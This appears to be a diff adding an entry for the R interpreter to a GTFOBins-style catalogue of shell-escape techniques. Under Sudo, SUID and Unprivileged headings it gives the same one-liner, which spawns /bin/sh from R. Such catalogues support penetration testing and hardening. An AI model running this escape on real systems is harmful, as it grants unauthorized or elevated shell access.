@@ -1,0 +1,14 @@
+R
+=
+
+Shell
+-----
+
+[Sudo]
+    R --no-save -e 'system("/bin/sh")'
+
+[SUID]
+    R --no-save -e 'system("/bin/sh")'
+
+[Unprivileged]
+    R --no-save -e 'system("/bin/sh")'
